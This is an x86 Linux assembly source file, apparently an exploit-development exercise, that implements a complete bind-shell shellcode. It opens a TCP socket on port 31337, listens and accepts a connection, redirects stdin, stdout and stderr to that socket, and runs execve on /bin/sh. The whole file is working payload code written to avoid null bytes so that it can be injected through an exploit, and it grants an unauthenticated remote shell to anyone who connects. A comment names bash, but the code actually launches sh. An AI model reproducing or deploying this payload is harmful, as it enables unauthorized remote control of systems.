global _start

section .text
_start:
	
	
	xor eax,eax
	xor ebx,ebx
 	xor ecx,ecx
	xor edx,edx
	
	; int socket(AF_INET,SOCK_STREAM,0);	
        mov al, 0x66            ; socket_call()
        inc bl                 	; socket() = 1
        push ecx		; sin_zero
        push byte 0x6           ; IPPROTO_TCP
        push byte 0x1           ; SOCK_STREAM
        push byte 0x2           ; AF_INET
        mov ecx, esp            ; argument's pointer
        int 0x80

	xchg esi,eax		; save sockfd in esi
	

	; int bind(int sockfd, const struct sockaddr *addr,
    	;        socklen_t addrlen)
	mov al,0x66
        pop bx                  ; bl = 2
        push edx		; INADDR_ANY = 0, edx is zero now
        push word 0x697a        ; 31337
        push word bx            ; AF_INET
        mov ecx,esp             ; struct sockaddr_in
        push 0x10               ; sizeof (struct sockaddr)
        push ecx                ; struct sockaddr_in *clientaddr
        push esi                ; sockfd
        mov ecx, esp            ; pointer to bind() arguments
        int 0x80		; bl is not modified, it still is bl=2 for 
				; socket_call/()
	
	; int listen(sockfd, int backlog)	
	mov al, 0x66
	mov bl, 0x4		; This can be replaced with shl,0x1 (mulitply x 2)
	push byte 0x1		; 1 set only 1 connection 
	push esi		; sockfd
	mov ecx, esp		; pointer to function args
	int 0x80

	
	; int accept(int sockfd, struc sockaddr *addr,socklen_t *size)
	mov al,0x66
	mov bl,0x5
	push edx		; sin_zero
	push edx		; INADDR_ANY
	push esi		; sockfd
	mov ecx,esp		; pointer to the args
	int 0x80

	
	; Loop and use dup2 to clone all three standard file descriptors
	; stdin, stdout and stderr
	; int dup2(int oldfd, int newfd)
	; int dup2(int oldfd, int newfd)
	; int dup2(int oldfd, int newfd)
	xor ecx,ecx
        xchg eax,ebx		; ebx holds the new socket descriptor
        mov cl,0x3		               
dup2:
        dec cl                 
        mov al,0x3f
        int 0x80                
        jne dup2                


	; int excecve("/bin//bash",NULL,NULL)
	xor eax,eax
        mov al,0xb              
        push edx                
        push 0x68732f2f
        push 0x6e69622f         
        mov ebx,esp             
        push edx                
        push ebx                
        mov ecx,esp             
        push edx
        mov edx,esp             
        int 0x80



